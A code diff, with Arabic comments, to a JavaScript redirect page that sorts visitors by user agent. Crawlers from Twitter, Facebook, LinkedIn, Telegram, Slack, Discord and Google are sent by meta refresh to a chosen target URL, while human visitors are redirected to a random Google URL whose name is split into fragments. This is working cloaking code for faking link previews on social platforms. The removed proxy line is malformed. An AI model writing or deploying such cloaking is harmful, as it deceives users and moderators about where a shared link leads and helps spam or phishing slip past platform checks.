@@ -9,16 +9,14 @@
       var currentUrl = window.location.href;
       var targetUrl = "";
 
-      // 1. استخراج الرابط وتنظيفه من أي رموز زائدة تلقائياً لضمان العمل
-      if (currentUrl.includes("1.html/")) {
-        targetUrl = currentUrl.split("1.html/")[1].trim();
-      } else if (currentUrl.includes("?to=")) {
+      // استخراج الرابط المستهدف من المتغير ?to=
+      if (currentUrl.includes("?to=")) {
         var urlParams = new URLSearchParams(window.location.search);
         targetUrl = urlParams.get('to');
       }
 
-      // تنظيف الرابط إذا كان يحتوي على رموز مكررة مثل :// في المنتصف
       if (targetUrl) {
+        // تنظيف الرابط من أي رموز زائدة
         targetUrl = targetUrl.replace(/^(:\/\/|:\/|\/)+/, "");
         if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
           targetUrl = "https://" + targetUrl;
@@ -31,47 +29,12 @@
       var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
 
       if (!isBot) {
-        // 2. الزائر الحقيقي: تحويل عشوائي فوري إلى جوجل
+        // الزائر الحقيقي: توجيه فوري وعشوائي إلى جوجل كالعادة
         var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
         window.location.replace("https://" + a + b + c + d);
       } else {
-        // 3. البوت: جلب المعاينة الحقيقية عبر الوسيط السحابي
-        var proxyUrl = "https://allorigins.win" + encodeURIComponent(targetUrl);
-        
-        fetch(proxyUrl)
-          .then(function(response) { return response.json(); })
-          .then(function(data) {
-            var html = data.contents;
-            var titleMatch = html.match(/<title[^>]*>([^<]+)<\/title>/i);
-            var siteTitle = titleMatch ? titleMatch[1].trim() : "View Content";
-            document.title = siteTitle;
-
-            var getMeta = function(property) {
-              var reg = new RegExp('<meta[^>]*?(?:property|name)=["\']' + property + '["\'][^>]*?content=["\']([^"\']+)["\']|<meta[^>]*?content=["\']([^"\']+)["\'][^>]*?(?:property|name)=["\']' + property + '["\']', 'i');
-              var match = html.match(reg);
-              return match ? (match[1] || match[2]).replace(/&amp;/g, '&') : null;
-            };
-
-            var ogTitle = getMeta("og:title") || siteTitle;
-            var ogDescription = getMeta("og:description") || "Click to view content";
-            var ogImage = getMeta("og:image") || "";
-
-            var metaConfig = [
-              { property: "og:title", content: ogTitle },
-              { property: "og:description", content: ogDescription },
-              { property: "og:image", content: ogImage },
-              { name: "twitter:card", content: "summary_large_image" },
-              { name: "twitter:title", content: ogTitle },
-              { name: "twitter:description", content: ogDescription },
-              { name: "twitter:image", content: ogImage }
-            ];
-
-            metaConfig.forEach(function(tag) {
-              var element = document.createElement('meta');
-              for (var key in tag) { if (tag[key]) element.setAttribute(key, tag[key]); }
-              document.getElementsByTagName('head')[0].appendChild(element);
-            });
-          }).catch(function() {});
+        // البوت: استخدام أداة إعادة توجيه الميتا المباشرة لفرض سحب البيانات بأسرع طريقة ممكنة
+        document.write('<meta http-equiv="refresh" content="0;url=' + targetUrl + '">');
       }
     })();
   </script>
